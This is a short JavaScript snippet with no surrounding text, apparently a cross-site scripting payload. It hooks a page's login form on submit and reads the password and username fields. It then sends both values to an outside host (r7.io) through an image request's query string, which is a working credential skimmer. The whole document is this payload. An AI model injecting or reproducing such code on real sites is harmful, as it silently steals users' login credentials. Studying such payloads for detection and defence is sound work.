
document.getElementById('login').onsubmit=function() {     
    i = new Image();     
    i.src = encodeURI('http://r7.io/e/akean?s='+"password = "+
    document.getElementById('login_password').value+" username = "+
    document.getElementById('login_username').value); 
}   

